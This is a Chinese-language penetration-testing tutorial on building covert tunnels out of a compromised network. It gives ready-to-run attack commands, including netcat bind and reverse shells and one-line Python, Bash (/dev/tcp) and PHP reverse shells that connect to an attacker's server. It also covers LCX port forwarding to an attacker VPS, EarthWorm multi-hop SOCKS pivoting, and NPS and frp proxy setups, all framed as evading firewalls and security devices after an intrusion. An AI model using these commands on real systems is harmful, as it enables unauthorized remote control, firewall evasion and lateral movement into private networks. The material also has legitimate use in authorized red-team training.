隧道简介

隧道技术是我们在获取到Web服务权限后做的事情，隧道技术常用于在访问受限制的网络环境中实现数据流动和非受信任的网络中实现安全的数据传输。

在实战渗透过程中，各种安全设备会检查对外连接的情况，如果发现异常，会对该通信进行阻断。因此我们需要建立一个隐秘的隧道，能绕过端口屏蔽，穿透防火墙的安全设备，以此来达到我们渗透的目的。

这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。

在一些网络环境中，如果攻击者使用各类上层隧道（例如HTTP隧道，DNS隧道，正反向端口转发等）进行操作失败的话。那么可以尝试使用ICMP建立隧道，ICMP协议不需要端口的开放，因为其基于IP工作的，所以我们将其归结到网络层，ICMP消息最为常见的就是Ping命令的回复，将TCP/UDP数据包封装到ICMP的Ping数据包中，从而穿过防火墙（通常防火墙是不会屏蔽Ping数据包的）。

常见的隧道

    网络层隧道：IPv6、ICMP、GRE等。
    传输层隧道：TCP、UDP、常规端口转发等。
    应用层隧道：SSH、HTTP、HTTPS、DNS等。

探测内网服务器出网协议

首先我们需要判断内网的连通性，连通性是指判断是否正能上网。要综合判断各种协议（TCP、HTTP、DNS、ICMP等）以及端口的通信情况。常见允许流量出口的有80、8080、443等一些常用端口。
ICMP协议
Default
Ping 外网IP地址或者域名
TCP协议
Default
nc -zv 192.168.253.23 3306  //windows一样
HTTP协议
Default
curl https://www.baidu.com
DNS协议
Default
nslookup www.baidu.com
特殊情况
Default
有一种情况是流量不能直接出来，需要进行内网代理。
 
1.查看网络连接，判断是否存在与其他机器的8080 （不绝对）等端口的连接，可尝试运行ping -n 1 -a ip命令。
 
2.查看内网中是否有主机名类似于"proxy”的机器。
 
3.查看IE浏览器的直接代理。
 
4.根据PAC（代理自动配置）文件的路径（远程、本地），将其下载并查看。
 
5.执行如下命令，利用curl工具确认。
 
    curl https://www.baidu.com //不通
    curl -x proxy-ip:port www.baidu.com //通过

网络层隧道技术

在网络层隧道技术中，两个常用的隧道协议是IPv6和ICMP。但在搭建隧道的时候不会考虑网络层隧道，所以网络层的只做简单的介绍。

IPv6隧道

IPv6是用来替代IPv4的一种新的IP协议。也被称为下一代互联网协议。
IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术。将IPv6报文整体封装在IPv4数据报文中，使IPv6报文整体封装在IPv4数据报文中，使IPv6报文能通过IPv4，到达另一个IPv6上面。

ICMP隧道

建立ICMP隧道，将TCP/UDP数据封装在ICMP的Ping数据包中，从而穿过防火墙。
常用的ICMP隧道工具有

    icmpsh
    pingTUnnel
    icmptunnel
    powershell icmp

传输层隧道技术

LCX隧道

LCX是一个比较经典的转发工具。端口转发有两个 一个是LCX一个是SSH。LCX与SSH不同的点是。LCX只能端口对端口转发，不能全局转发，但SSH可以。
Default
上传Lcx.exe，目标服务器上执行
Lcx.exe -slave VPS地址 4444 127.0.0.1 3389
 
命令的意思是把3389端口的所有数据转发到公网vps上
 
然后在攻击者服务器上
Lcx.exe -listen 4444 5555
 
 
win+r，输入mstsc进行远程连接，
vps的ip+5555端口就可以连接到目标机器的3389端口（需要关掉防火墙）

nc（netcat）隐藏隧道技术

kali自带，windows需要安装。nc有两种方式可以获得shell

    正向Shell：正向客户端连接服务器，客户端想要获取服务器的Shell。
    反向Shell：反向客户端连接服务器，服务器想要获取客户端的Shell。反向Shell通常用在开启了防护措施的目标及其上，例如防火墙过滤端口转发等。

正向shell

攻击者连接目标主机，上传nc64.exe
Default
nc -Lvp 4445 -e /bin/sh   //lInux命令  lInux只弹lInux的
nc64.exe -lvp 4445 -e c:\windows\system32\cmd.exe   //wIndows命令

攻击者输入
Default
nc64.exe 目标服务器ip 4445

反向shell

攻击者上开启监听端口
Default
nc64.exe -lvp 4446     //此处无-e

目标主机
Default
nc64.exe ip地址 -e c:\windows\system32\cmd.exe  #windows
nc ip地址 4446 -e /bin/sh         #Linux

扩展
Default
查看对方21端口上运行的信息和信息版本
nc -nv 目标ip 21
 
端口扫描
nc -v IP地址 80
80端口开启会显示 open
 
多端口扫描
nc64.exe -v -z IP地址 20-1024
 
端口监听
nc64.exe -l -p 192.168.253.23 80

特殊情况
Default
在一般情况下，目标主机中是没有nc的，可以使用其他工具和编程语言来代替nc，实现反向连接，方法很多，可以参考。
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Python反向 shell
Default
攻击机监听4447端口
nc -lvp 4447
 
目标主机
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击者服务器ip",4447));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Bash反向Shell
Default
攻击机
nc -lvp 4448
 
目标主机
bash -i >& /dev/tcp/攻击者服务器ip/4448 0>&1

PHP反向shell
Default
攻击机
nc -lvp 4449
 
目标主机
php -r '$sock=fsockopen("192.168.253.16",4449);exec("/bin/sh -i <&3 >&3 2>&3");'

应用层隧道技术

EarthWorm（EW）

必须攻击者能访问到他的IP ，才能使用正向代理，否则需要使用反向代理。

一级网络环境
正向
Default
目标机器
ew -s ssocksd -l 888
 
攻击者
利用proxifier连接
 
win+r运行远程桌面连接
反向
Default
需要在vps上运行ew 目标主机去访问公网VPS
 
公网VPS
ew -s rcsocks -l 1008 -e 888
 
内网机器
ew -s rssocks -d vps的ip -e 888
显示ok 说明连接成功
 
我们用proxifier去连接公网的vps 的端口（1008）
就能访问内网并进行远程控制

二级网络环境

主机A：无公网IP，可以访问外网，无法访问内网资源。
主机B：只能访问内网资源，无法访问外网。
Default
VPS上：
ew -s lcx_listen -l 1080 -e 888
即在VPS中添加转接隧道，将1080端口收到的代理请求转发给888端口。
 
B主机执行，利用socksd方式启动999端口的SOCKS代理：
ew -s ssocksd -l 999
 
A主机执行，即将VPS的888端口和B主机的999端口连接起来：
ew -s lcx_slave -d VPS 的 IP 地址-e 888 -f B 主机-g 999
 
执行后运行代理工具全局即可！

三级网络环境

主机A：无公网IP，可以访问外网。
主机B：只能访问内网资源，无法访问外网，只能被A访问。
主机C：可以被B访问并能访问核心区域。
Default
在VPS上执行，将1080端口收到的代理请求转发到888端口：
ew -s rcsocks -l 1080 -e 888
 
在A主机上将VPS的888端口与B主机的999端口连接起来：
ew -s lcx_slave -d VPS -e 888 -f B主机 -g 999
 
在B主机上将999端口收到的代理请求转发到777端口：
ew -s lcx_listen -l 999 -e 777
 
在C主机上启动SOCKS5服务并反弹到777端口：
ew -s rssocks -d B -e 777

NPS隐秘隧道搭建

运行命令“nps start”启动服务端
通过8080端口访问服务端的Web界面
输入默认用户名、密码admin、123登录，登录后可以看到默认客户端连接端口为8024
添加客户端，配置唯一验证密钥，验证密钥在从客户端连接到服务端时使用，此处配置为“any”，然后开启压缩和加密传输。
最后在边界主机运行命令“npc.exe -server=192.168.1.7:8024 -vkey=any”来连接服务端
连接成功后在攻击机的Web界面可看到客户端上线

TCP隧道

客户端上线后便可以通过Web界面单击上线的客户端、查看选项、配置隧道，例如，若想访问内网主机的3389端口，则可通过TCP隧道将内网主机的3389端口映射到攻击机的1111端口，单击“新增”，配置目标“192.168.52.143:3389”，配置服务端口为“1111”
TCP隧道建立成功后，即可通过连接攻击机的1111端口来连接内网主机的远程桌面，在攻击机运行命令“rdesktop 192.168.1.7:1111”连接本地的1111端口

SOCKS5代理

若想搭建HTTP代理或SOCKS代理，只需选择对应模式，填写服务端端口即可，以SOCKS为例，选择模式为“SOCKS代理”，服务端端口为“1234”
配置好SOCKS代理后，便可使用攻击机192.168.1.7的1234端口访问内网
配置代理服务器
通过浏览器插件SwitchyOmega,配置攻击机的192.168.1.7的1234端口
然后浏览器输入内网地址直接访问

frp

攻击机-服务端：设置frps.ini
Default
[common]
bind_port = 7000

然后运行frps.exe -c frps.ini
跳板机-客户端：server_addr为攻击机IP设置frpc.ini
Default
[common]
server_addr = 192.168.1.6
server_port = 7000
[socks5]
type = tcp
remote_port = 8010
plugin = socks5

然后运行frpc.exe -c frpc.ini

SwitchyOmega配置或者proxifier配置，设置跳板机的ip和端口